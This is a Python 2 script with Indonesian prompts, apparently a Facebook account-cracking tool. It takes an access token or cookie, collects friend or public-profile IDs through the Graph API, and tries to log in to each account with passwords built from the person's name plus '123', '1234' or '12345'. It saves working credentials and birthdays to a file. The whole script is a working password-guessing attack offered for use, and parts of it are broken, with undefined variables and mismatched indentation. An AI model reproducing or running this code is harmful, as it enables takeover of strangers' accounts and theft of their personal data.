#!/usr/bin/python2
# coding=utf-8
#fall24

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 ryn.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36')]

def keluar():
	print ("[!] Exit")
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)



#########LOGO#########
logo = """
🌷 radhinallhaady@gmail.com 🌷
🌷 anonymousindonesiaanonymousind@gmail.com 🌷
🌷Recod by radhin mods WhatsApp 🌷
"""

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
gagal = []
vulnot = "Not Vuln"
vuln = "Vuln"

######MASUK######
def masuk():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 48*'-'
        print '[1] Login Pake Token'
        print '[2] Login Pake Cookies'
        print '[0] Keluar'
        print 48* '-'
        pilih_masuk()


def pilih_masuk():
    msuk = raw_input('[?] Pilih : ')
    if msuk == '':
        print '[!] Isi Yg Benar !'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '2' or msuk == '02':
        cookie()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '[!] Isi Yg Benar !'
        pilih_masuk()


def cookie():
    os.system('clear')
    print logo
    print 48*'-'
    cookie = raw_input('[?] Cookie : ')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail : maybe your cookie invalid !!' if find_token is None else '\n*   Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '[!] No Connection'

    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    jalan ('\x1b[1;92m[+] Login Berhasil\x1b[1;97m')
    menu()
    


def tokenz():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 48* '-'
        toket = raw_input('[?] Token :\x1b[1;97m ')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            zedd = open('login.txt', 'w')
            zedd.write(toket)
            zedd.close()
            jalan ('\x1b[1;92m[+] Login Berhasil\x1b[1;97m\x1b[1;97m')
            menu()
        except KeyError:
            print '[\x1b[1;97m!\x1b[1;97m] \x1b[1;97mToken salah !'
            time.sleep(1.7)
            tokenz()



######MENU#######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91m Token Udah Mati!"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print" Ora Ono Internet"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;97m _______________________________________"
	print "\033[1;97m Selamat Datang\033[1;97m "+nama
	print "\n\033[1;97m User ID\033[1;97m         ->\033[1;97m "+id
	print "\033[1;97m Tanggal Lahir\033[1;97m   ->\033[1;97m "+ a['birthday']
	print "\033[1;97m _______________________________________"
	print "\033[1;97m 1.) Crack Dari Publik/Teman"
	print "\033[1;97m 2.) Ambil Id Dengan Username"
	print "\033[1;97m 0.) Logout \n"
	pilih()

######PILIH######
def pilih():
	unikers = raw_input("\033[1;97m Fall24: ")
	if unikers =="":
		print "\033[1;97m _______________________________________"
		pilih()
	elif unikers =="1" or unikers =="01":
		indo()
	elif unikers =="2" or unikers =="02":
		id_gen()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;97m Isi Sing Bener Cok !"
		pilih()


########## CRACK INDONESIA #######
def indo():
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m Token Wes Bosok !"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	print "\033[1;97m _______________________________________"
	print "\033[1;97m 1.) Crack Dari Daftar Teman"
	print "\033[1;97m 2.) Crack Dari Publik"
	print "\033[1;97m 0.) Kembali \n"
	pilih_indo()

#### PILIH INDONESIA ####
def pilih_indo():
	teak = raw_input("\033[1;97m Fall24: ")
	print "\033[1;97m _______________________________________"
	if teak =="":
		print"\033[1;97m Isi Sing Bener Cok !"
		pilih_indo()
	elif teak =="1" or teak =="01":
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
	        idt = raw_input("\033[1;97m Masukan ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m Nama : "+op["name"]
		except KeyError:
			print"\033[1;97m ID Tidak Ada !"
			raw_input("\n Kembali ")
			indo()
		except requests.exceptions.ConnectionError:
			print"[ Ora Ono Internet !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m Isi Sing Bener Cok !"
		pilih_indo()
	
	print "\033[1;97m Total ID : "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m Otw Crack "+o),;sys.stdout.flush();time.sleep(1)

	print "\n\033[1;97m _______________________________________"
	print "\033[1;97m Pencet CTRL+Z untuk berhenti,"
	print "\033[1;97m Mode Pesawat jika tidak ada hasil"
	print "\033[1;97m _______________________________________"
	
	
##### MAIN INDONESIA #####
	def main(arg): 
		global cekpoint,oks
		em = arg
		try:
			os.mkdir('done')
		except OSError:
			pass 
		try:
			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
			v = json.loads(an.text)
			pw = v['first_name']+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\033[1;92m --> ' + em + '|' + pw + '|' + c['birthday']
				oke = open('done/indo.txt', 'a')
				cek.write("\n[Berhasil]:" +em+ " pw:" +pw+ " TTL:" +c['birthday'])
				oke.close()
				oks.append(em)
			else:
				if 'checkpoint' in xo:
					print '\033[1;92m --> ' + em + '|' + pw + '|' + c['birthday']
					cek = open('done/indo.txt', 'a')
					cek.write("\n[Cekpoint]:" +em+ " pw:" +pw+ " TTL:" +c['birthday'])
					cek.close()
					cekpoint.append(em)
				else:
					pw2 = v['first_name']+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[1;92m --> ' + em + '|' + pw2 + '|' + c['birthday']
						oke = open('done/indo.txt', 'a')
						cek.write("\nBerhasil:" +em+ " pw:" +pw2+ " TTL:" +c['birthday'])
						oke.close()
						oks.append(em)
					else:
						if 'checkpoint' in xo:
							print '\033[1;92m --> ' + em + '|' + pw2 + '|' + c['birthday']
							cek = open('done/indo.txt', 'a')
							cek.write("\n[Cekpoint]:" +em+ " pw:" +pw2+ " TTL:" +c['birthday'])
							cek.close()
							cekpoint.append(em)
						else:
							pw3 = v['first_name']+'1234'
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[1;92m --> ' + em + '|' + pw3 + '|' + c['birthday']
								oke = open('done/indo.txt', 'a')
								cek.write("\n[Berhasil]:" +em+ " pw:" +pw3+ " TTL:" +c['birthday'])
								oke.close()
								oks.append(em)
							else:
								if 'checkpoint' in xo:
									print '\033[1;92m --> ' + em + '|' + pw3 + '|' + c['birthday']
									cek = open('done/indo.txt', 'a')
									cek.write("\n[Cekpoint]:" +em+ " pw:" +pw3+ " TTL:" +c['birthday'])
									cek.close()
									cekpoint.append(em)
								else:
									pw4 = v['last_name']+'12345'
									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print '\033[1;92m --> ' + em + '|' + pw4 + '|' + c['birthday']
										oke = open('done/indo.txt', 'a')
										cek.write("\n[Berhasil]:" +em+ " pw:" +pw4+ " TTL:" +c['birthday'])
										oke.close()
										oks.append(em)
									else:
										if 'checkpoint' in xo:
											print '\033[1;92m --> ' + em + '|' + pw4 + '|' + c['birthday']
											cek = open('done/indo.txt', 'a')
											cek.write("\n[Cekpoint]:" +em+ " pw:" +pw4+ " TTL:" +c['birthday'])
											cek.close()
											cekpoint.append(em)
										else:
											pw5 = v['last_name']+'123'
			                                rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw5, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			                                xo = rex.content
			                                if 'mbasic_logout_button' in xo or 'save-device' in xo:
				                                print '\033[1;92m --> ' + em + '|' + pw5 + '|' + c['birthday']
				                                oke = open('done/indo.txt', 'a')
				                                cek.write("\n[Berhasil]:" +em+ " pw:" +pw5+ " TTL:" +c['birthday'])
				                                oke.close()
				                                oks.append(em)
			                                else:
				                                if 'checkpoint' in xo:
					                                print '\033[1;92m --> ' + em + '|' + pw5 + '|' + c['birthday']
					                                cek = open('done/indo.txt', 'a')
					                                cek.write("\n[Cekpoint]:" +em+ " pw:" +pw5+ " TTL:" +c['birthday'])
					                                cek.close()
					                                cekpoint.append(em)
		except IOError:			                             
			pass
	p.map(main, id) 
	print '\033[0;97m• \033[0;97mSelesai ...'
	print "\033[0;97m• \033[0;97mTotal \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97m: \033[0;97m"+str(len(oks))+"\033[0;97m/\033[0;97m"+str(len(cekpoint))
	print '\033[0;97m• \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile tersimpan \033[0;97m: \033[0;97mdone/follow.txt'
	print 50* "\033[0;97m─"
	raw_input("\033[0;97m< \033[0;97mKembali\033[0;97m >")

##### USERNAME ID ####
def id_gen():
	os.system('clear')
	print logo
	print 50* "\033[1;97m─"
	ling = ('https://www.facebook.com/')
	url = ling+raw_input("\033[1;97m -> Username : ")
	idre = re.compile('"entity_id":"([0-9]+)"')
	page = requests.get(url)
	print idre.findall(page.content)
	raw_input("\n\033[1;97m Enter Untuk Kembali :)")
	menu()

if __name__=='__main__':
    menu()
    masuk()
